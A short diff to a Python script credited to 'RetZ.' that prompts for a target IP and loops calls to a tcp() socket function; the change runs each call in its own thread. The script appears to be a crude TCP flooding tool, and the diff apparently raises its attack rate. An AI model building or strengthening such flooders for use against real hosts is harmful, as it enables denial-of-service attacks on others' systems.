@@ -1,4 +1,4 @@
-import socket
+import socket, threading
 
 print('Credit By RetZ.')
 ip = str(input('Ip: '))
@@ -14,4 +14,5 @@ def tcp():
   s.close
 
 for i in range(1, times):
-  tcp()
+  th = threading.Thread(target = tcp)
+  th.start()
